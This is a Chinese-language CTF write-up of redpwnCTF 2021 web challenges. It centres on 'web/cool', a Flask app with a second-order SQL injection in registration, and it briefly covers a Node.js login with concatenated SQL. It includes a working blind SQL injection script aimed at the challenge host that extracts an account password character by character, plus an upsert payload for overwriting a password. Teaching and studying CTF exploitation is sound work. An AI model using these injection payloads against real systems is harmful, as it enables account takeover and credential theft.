&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/?message=Username and password required!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT id FROM users WHERE
&lt;/span>&lt;span style="color:#d88200"> username = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39; AND
&lt;/span>&lt;span style="color:#d88200"> password = &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;;`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prepare&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/?message=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FLAG&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Incorrect login&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">`/?message=Incorrect username or password. Query: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>他这个b64加密是发生在前端的，也就是在发包的时候就已经对post的数据进行了预处理，而具体到后端进行sql语句的查询时会直接拼接req.body.username/passwd的数据，不会进行进一步的检查或过滤&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104923251.png" alt="image-20210710104923251">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710104859539.png" alt="image-20210710104859539">&lt;/p>
&lt;p>刚开始想复杂了&lt;/p>
&lt;h2 id="webcool">web/cool&lt;/h2>
&lt;blockquote>
&lt;p>Aaron has a message for the cool kids. For support, DM BrownieInMotion.&lt;/p>
&lt;p>&lt;a href="https://cool.mc.ax/">cool.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/e03916d52bb7e84cbd2f9f26e5de162fdd0442c40d8397a103aab5813031fd83/app.py">app.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>登录框，可以注册 先尝试test: test 登录成功但是无法获取信息（注册后也会跳转这个页面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105453861.png" alt="image-20210710105453861">&lt;/p>
&lt;p>留意cookie部分，是熟悉的flask session，扔进工具里解密&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710105534823.png" alt="image-20210710105534823">&lt;/p>
&lt;p>再参考源码中的/message部分，考虑将session设为{&amp;ldquo;username&amp;rdquo;:&amp;ldquo;ginkoid&amp;rdquo;}后登入查看信息（开始以为是session伪造 后来发现不是）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710113131546.png" alt="image-20210710113131546">&lt;/p>
&lt;p>看一下其他部分的源码，首先是init()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#75715e"># this is terrible but who cares&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE IF NOT EXISTS users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;DROP TABLE users;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> CREATE TABLE users (
&lt;/span>&lt;span style="color:#d88200"> username TEXT PRIMARY KEY,
&lt;/span>&lt;span style="color:#d88200"> password TEXT
&lt;/span>&lt;span style="color:#d88200"> );
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># put ginkoid into db&lt;/span>
&lt;span style="color:#111">ginkoid_password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">generate_token&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT OR IGNORE INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;UPDATE users SET password=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ginkoid_password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">ginkoid&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后是在创建用户&lt;code>create_user()&lt;/code>和登录&lt;code>check_login()&lt;/code>时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">allowed_characters&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Alphanumeric usernames only, please.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username is too short.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Password is too long.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">other_users&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;SELECT * FROM users WHERE username=&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">;&amp;#39;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other_users&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Username taken.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">execute&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span>
&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span> &lt;span style="color:#75715e"># passwd部分可控&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710122622508.png" alt="image-20210710122622508">&lt;/p>
&lt;p>构造passwd部分为 &lt;code>'),('ginkoid','passwd&lt;/code>&lt;/p>
&lt;p>emmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时&lt;code>correct_password[0][0]==password&lt;/code>，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是&lt;code>[0][0]&lt;/code>，而新插入的passwd将是&lt;code>[1][0]&lt;/code>；并且在&lt;code>init()&lt;/code>时定义username是primary 也不可能有重复的&lt;/p>
&lt;p>————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现&lt;/p>
&lt;p>在看了&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">这篇wp&lt;/a>之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是&lt;/p>
&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
&lt;/code>&lt;/pre>&lt;p>其中的&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>，在&lt;a href="https://www.sqlite.org/lang_UPSERT.html">这篇官方文档&lt;/a>里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
&lt;p>最后使用盲注的方式，先上一下脚本 （&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">这里是来源&lt;/a>）再说说思路&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://cool.mc.ax/&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># url = &amp;#34;http://127.0.0.1:5000/&amp;#34;&lt;/span>
&lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;asdfjwfoijweoijfojiewfj&amp;#34;&lt;/span>
&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789&amp;#34;&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">time&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">time_ns&lt;/span>&lt;span style="color:#111">())&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;0&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 注意白名单里没有0 要换掉&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;register&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">})&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;Incorrect&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">val&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">val&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注入点仍然是上文提到的&lt;code>/register&lt;/code>路由中&lt;code>create_user(username,password)&lt;/code>（当时找对了注入点，但是盲注这块还是做的少）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806085327316.png" alt="image-20210806085327316">&lt;/p>
&lt;p>主要的payload是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;||(select substr(password,&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">,1) from users)||&amp;#39;&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这一句，当进入到注册流程时 会执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users (username, password)&amp;#39;&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;VALUES (&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">);&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>即&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">excute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;INSERT INTO users(username, password)&amp;#39;&lt;/span> &lt;span style="color:#111">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxusernamexxxx&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">select&lt;/span> &lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">||&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>||&lt;/code>连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句&lt;code>select substr(password,n,1) from users&lt;/code>，而查询语句返回的是&lt;code>substr(password,n,1)&lt;/code> 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个&lt;code>for in _ in charset&lt;/code>遍历，在登录处 把这个值给试出来&lt;/p>
&lt;p>&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">英文版讲解&lt;/a>：&lt;em>The SELECT statement will take the character at index in ginkoid&amp;rsquo;s password, and concatenate it with &amp;lsquo;&amp;rsquo;, to be used as the new user&amp;rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.&lt;/em>&lt;/p>
&lt;p>获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到&lt;/p>
